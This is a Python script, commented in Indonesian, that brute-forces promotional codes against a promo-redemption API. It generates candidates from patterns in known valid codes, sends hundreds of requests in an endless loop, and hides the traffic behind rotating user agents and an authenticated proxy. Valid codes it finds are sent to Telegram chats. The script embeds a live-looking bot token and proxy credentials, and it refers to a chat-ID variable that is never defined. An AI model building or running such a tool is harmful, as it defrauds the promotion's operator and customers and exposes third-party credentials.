import asyncio
import aiohttp
import aiofiles
import requests
import random
import time
from collections import Counter
import logging
import os

# Konfigurasi warna ANSI
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BRIGHT = "\033[1m"
RESET = "\033[0m"

# Konfigurasi logging ke file untuk debugging
logging.basicConfig(filename='validation.log', format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Daftar User-Agent untuk rotasi
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A5341f Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# Konfigurasi Telegram
TELEGRAM_BOT_TOKEN = '7620704354:AAFa19rWmJ3pQKEExzK4hJGxSi26BTz-t1E'
CHAT_IDS = ['6426778764', '6180131575']

# Konfigurasi proxy
PROXIES = [
    {
        'proxy_host': 'gw.dataimpulse.com',
        'proxy_port': '823',
        'proxy_username': 'd84172e9eb36a964d3af__cr.id',
        'proxy_password': '1934704c7bbda20d'
    },
]

# Fungsi pembaca dataset kode yang valid
async def read_valid_dataset(file_path='valid_codes.txt'):
    file_path = os.path.join(os.path.dirname(__file__), file_path)
    async with aiofiles.open(file_path, 'r') as f:
        valid_codes = [line.strip() for line in await f.readlines()]
    return valid_codes

# Fungsi untuk menyimpan kode valid ke file dan mengirimnya ke Telegram
async def save_valid_code(code, file_path='valid_codes.txt'):
    file_path = os.path.join(os.path.dirname(__file__), file_path)
    async with aiofiles.open(file_path, 'a') as f:
        await f.write(f"{code}\n")
    
    # Kirim pesan ke Telegram
    message = f"{code}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.post(url, data=payload)
    print(f"Pesan Telegram terkirim, status: {response.status_code}")

# Fungsi untuk mendapatkan pola kode dari dataset
def get_code_patterns(valid_codes):
    prefixes = [code[:2] for code in valid_codes]
    suffixes = [code[-2:] for code in valid_codes]
    return [prefix for prefix, _ in Counter(prefixes).most_common()], [suffix for suffix, _ in Counter(suffixes).most_common()]

# Fungsi untuk menghasilkan kode acak sesuai pola dataset
def generate_code_from_pattern(prefix_list, suffix_list):
    characters = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'
    return f"{random.choice(prefix_list[:5])}{''.join(random.choices(characters, k=4))}{random.choice(suffix_list[:10])}"

# Limit jumlah koneksi secara bersamaan
sem = asyncio.Semaphore(100)  # Batasi jumlah koneksi untuk menghindari beban berlebih

# Fungsi untuk mendapatkan proxy dengan autentikasi
def get_proxy_auth(proxy_config):
    return aiohttp.BasicAuth(
        login=proxy_config['proxy_username'],
        password=proxy_config['proxy_password']
    )

# Validasi kode asinkron dengan retry, rotasi proxy, dan exponential backoff
async def validate_code(session, code, max_retries=3):
    async with sem:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Content-Type': 'application/json',
        }
        payload = {"uniq_code": code}

        for attempt in range(1, max_retries + 1):
            proxy_config = PROXIES[(attempt - 1) % len(PROXIES)]  # Rotasi proxy
            proxy_url = f"http://{proxy_config['proxy_host']}:{proxy_config['proxy_port']}"
            proxy_auth = get_proxy_auth(proxy_config)
            
            try:
                async with session.post(
                    'https://dashboard.yamalubepromo.com/api/v1/wziioquyqthkal',
                    json=payload, headers=headers, proxy=proxy_url,
                    proxy_auth=proxy_auth, timeout=10
                ) as response:
                    response_data = await response.text()
                    if response.status == 200:
                        await save_valid_code(code)  # Simpan kode valid dan kirim ke Telegram
                        return code, response.status, response_data
                    elif response.status == 400:
                        return code, response.status, response_data
                    elif response.status == 500:
                        logger.warning(f"{RED}Server error 500 for {code} - attempt {attempt}{RESET}")
                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
            except Exception as e:
                logger.error(f"{RED}Error for {code} on attempt {attempt}: {str(e)}{RESET}")
                await asyncio.sleep(2 ** attempt)  # Exponential backoff

        # Jika gagal setelah semua percobaan
        return code, 500, "Max retries reached with status 500"

# Fungsi validasi batch paralel
async def perform_validation(count, prefix_list, suffix_list):
    async with aiohttp.ClientSession() as session:
        tasks = [validate_code(session, generate_code_from_pattern(prefix_list, suffix_list)) for _ in range(count)]
        return await asyncio.gather(*tasks)

# Fungsi untuk rekapitulasi hasil
async def rekapitulasi(valid_codes, invalid_codes, error_codes, duration):
    summary = (
        f"\n{BRIGHT}REKAPITULASI:{RESET}\n"
        f"{GREEN}Total kode valid: {len(valid_codes)}{RESET}\n"
        f"{YELLOW}Total kode invalid: {len(invalid_codes)}{RESET}\n"
        f"{RED}Total kode error: {len(error_codes)}{RESET}\n"
        f"{BRIGHT}Jumlah validasi kode: {len(valid_codes) + len(invalid_codes) + len(error_codes)}{RESET}\n"
        f"Waktu validasi: {duration:.2f} detik\n\n"
    )
    print(summary)

# Fungsi utama untuk validasi batch berulang
async def main():
    valid_codes = await read_valid_dataset()
    prefix_list, suffix_list = get_code_patterns(valid_codes)
    count = 100  # Jumlah kode yang ingin divalidasi dalam setiap batch

    while True:  # Looping tak terbatas
        start_time = time.time()
        
        # Melakukan validasi batch
        results = await perform_validation(count, prefix_list, suffix_list)
        
        valid, invalid, error = set(), set(), set()
        for code, status, data in results:
            if status == 200:
                valid.add(code)
                
            elif status == 400:
                invalid.add(code)
               
            else:
                error.add(code)
                
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Rekapitulasi hasil
        await rekapitulasi(valid, invalid, error, duration)
        
        # Jeda 0.2 detik sebelum memulai batch berikutnya
        await asyncio.sleep(0.2)

if __name__ == '__main__':
    asyncio.run(main())
